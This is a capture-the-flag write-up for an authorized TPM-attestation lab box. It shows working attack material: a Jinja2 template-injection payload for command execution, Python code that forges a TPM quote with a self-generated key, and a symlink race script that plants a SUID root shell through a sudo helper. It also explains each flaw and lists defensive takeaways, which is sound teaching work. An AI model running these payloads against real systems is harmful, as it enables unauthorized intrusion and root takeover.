# KeyStone

**Category:** boot2root · **Difficulty:** Medium · **Flags:** `isfcr{tr0st_but_v3rify_the_endors3ment}` (user) · `isfcr{a_pcr_is_a_promise_not_proof}` (root)

## Challenge

> "we dont do a little trolling" — Keystone attestation room. Flag format: `isfcr{...}`.

A TPM-attestation themed boot2root. An internal "vault" is supposed to release
its sealed secret only to a trusted TPM, proven by a signed quote. The catch:
the vault verifies the *shape and signature* of the quote but lets the client
choose the signing key — it never proves that key belongs to the machine's TPM.
Root is a classic TOCTOU symlink race in a `sudo`-able measurement helper.

> Authorized, disposable TryHackMe room; target IP changes per deploy. Uses
> `<target>` as a placeholder.

## Initial Analysis

Port 80 is **Keystone — Attestation Portal**. The home page and built-in docs
(`/review?doc=welcome|changelog|operators|deprecation`) leak the whole design:

- an internal vault on `127.0.0.1:9000`, a software TPM on `127.0.0.1:2321`;
- the changelog notes Jinja2 interpolation was "added to `/review`" and an
  unresolved issue **VAULT-114: AK provenance not linked to the EK**;
- the normal flow: `POST /attest` (AK pubkey) → nonce + required PCRs →
  `POST /verify` (quote + signature) → token → `GET /secret?token=...`.

## Vulnerability / Core Concept

### User — unbound attestation key (VAULT-114)

Requesting a nonexistent doc renders the name as Jinja2:

```bash
curl -sG --data-urlencode 'doc={{7*7}}' "http://<target>/review"   # -> Requested: 49
```

Escalate to RCE (command passed via a second query param so quotes don't nest):

```jinja2
{{cycler.__init__.__globals__.os.popen(request.args.get('x')).read()}}
# -> uid=1001(webapp) gid=1001(webapp) groups=1001(webapp),994(tpm)
```

RCE made the implementation readable (`/opt/vault/main.go`,
`/opt/keystone/tests/e2e.py` — the integration test is basically a ready-made
exploit). The vault correctly checks: RSA PKCS#1 v1.5/SHA-256 signature, TPM
magic `0xff544347`, attest type `0x8018` (`TPM_ST_ATTEST_QUOTE`),
`extraData == nonce`, and `pcrDigest == SHA256(PCR0||PCR1||PCR7)`.

**The fatal omission is credential activation.** There is no
`MakeCredential`/`ActivateCredential` step binding the submitted attestation key
(AK) to the trusted TPM's endorsement key (EK). So you can generate an ordinary
RSA key in Python, declare it as your "AK", and sign invented bytes — **no real
TPM needed.** That's the guard asking for a signed ID while letting the visitor
print their own ID and pick whose signature counts.

### Root — TOCTOU in `measure-and-run`

The sealed payload is the `tpm-admin` OpenSSH key; `sudo -l` as that user shows:

```
(root) NOPASSWD: /usr/sbin/measure-and-run *
```

Source at `/usr/local/src/measure-run/measure-run.c` reveals the bug — it
measures and executes by **path**, twice:

```c
hash_file(path, hash);          // open #1: hash it
extend_pcr(hash); is_allowed(hash);
usleep(20000);                  // deliberate 20 ms window
int fd2 = open(path, O_RDONLY); // open #2: resolves path AGAIN
fexecve(fd2, argv + 1, envp);   // executes whatever it resolves to now
```

Time-of-check ≠ time-of-use. If `path` is a symlink, swap its target after the
hash is approved but before the second `open()` → it measures `/bin/true` but
executes your script as root. PCR 23 records a *promise* about the measured
file, not *proof* the same file ran.

## Exploitation

### User

Run `forge_quote.py` **on the target** (vault is loopback-only), e.g. drop it via
the SSTI (`ssti.py`) base64 trick, then execute it. It generates an RSA key,
fetches the nonce + expected PCRs, builds exactly the `TPMS_ATTEST` subset
`main.go` parses, signs with its own key, and redeems the token:

```python
# core of forge_quote.py
key = rsa.generate_private_key(65537, 2048)
attest = request("/attest", {"ak_pub_pem": pub_pem})          # client-chosen "AK"
pcr_digest = sha256(PCR0||PCR1||PCR7)
quote = magic(0xFF544347) + type(0x8018) + qualifiedSigner(0) \
      + extraData(nonce) + clock + fwVersion + pcr_selection + pcr_digest
sig = key.sign(quote, PKCS1v15(), SHA256())                    # signed by OUR key
verified = request("/verify", {session, quote_msg, quote_sig})
print(request("/secret?token="+verified["token"])["payload"])  # sealed tpm-admin key
```

The vault returns a sealed blob containing the unencrypted `tpm-admin` OpenSSH
key. Save the PEM, `chmod 600`, and log in:

```bash
ssh -i tpm-admin.key tpm-admin@<target>
cat ~/user.txt   # isfcr{tr0st_but_v3rify_the_endors3ment}
```

### Root — win the race

The box even provides `~/race/{safe,evil,link}` (`safe` = copy of `/bin/true`,
hash matches the allowlist). Make `evil` drop a SUID root bash, then exploit the
helpfully-printed `policy ok` marker to time the swap deterministically:

```bash
cat > ~/race/evil <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash
EOF
chmod +x ~/race/evil

cd ~/race; ln -sfn safe link
(sudo /usr/sbin/measure-and-run "$PWD/link" >/tmp/measure.out 2>&1) & pid=$!
while ! grep -q 'policy ok' /tmp/measure.out 2>/dev/null; do :; done
ln -sfn evil link          # swap in the 20 ms window
wait "$pid"
```

`measure-run` hashes `safe` (`c79bf442...`, approved), the link flips to `evil`,
`open()`#2 follows it, and `fexecve()` runs the script as root. Then:

```bash
/tmp/rootbash -p          # euid=0
cat /root/root.txt        # isfcr{a_pcr_is_a_promise_not_proof}
```

## Flag

```
isfcr{tr0st_but_v3rify_the_endors3ment}   # user
isfcr{a_pcr_is_a_promise_not_proof}        # root
```

## Included files

- `forge_quote.py` — forges the `TPMS_ATTEST` quote with a client-generated RSA key and pulls the sealed `tpm-admin` key (talks to `127.0.0.1:9000`).
- `ssti.py` — Jinja2 SSTI command runner for `/review` (TARGET redacted).

> **Redacted:** the retrieved `tpm-admin` SSH private key and the vault's
> `vault-secret.txt` are intentionally **not** included — the technique to
> obtain them is above.

## Key Takeaways

- Verifying a quote's signature is meaningless if the client picks the key — an
  AK must be bound to a trusted EK via `MakeCredential`/`ActivateCredential`.
- Shipping an end-to-end integration test on the production host hands attackers
  a working exploit.
- Measure-then-execute by *path* is a textbook TOCTOU: open once and
  `fexecve()` the **same** descriptor you hashed. A printed "policy ok" marker
  turns a flaky race into a deterministic one.
- "A PCR is a promise, not proof" — attested measurement ≠ attested execution.
